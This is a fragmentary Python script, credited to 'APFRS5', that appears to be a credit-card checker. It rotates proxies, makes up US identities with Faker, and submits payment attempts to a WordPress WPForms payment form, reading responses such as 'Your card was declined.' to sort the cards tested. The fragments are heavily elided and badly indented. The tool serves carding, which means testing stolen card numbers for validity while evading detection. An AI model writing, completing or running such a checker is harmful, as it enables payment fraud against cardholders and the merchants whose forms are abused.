...
proxies={'http':proxy_gen, 'https':proxy_gen}
########### END PROXY #############
fake = Faker("en_US")
def info():
    #=================// SCRIPT BY APFRS5 //=================#
...
def found(html, start, end):
        hostss,portss, usser, passwdf= proxi_gen.split(":")
try:
...
'''
            ...
            if 'Your card was declined.' in res.text or 'requires_action' in res.text:
                ...
                datas=res.json();dta=datas["data"]["errors"]["general"]["footer"];mssg=found(dta, '<div class="wpforms-error-container">', '</div>')
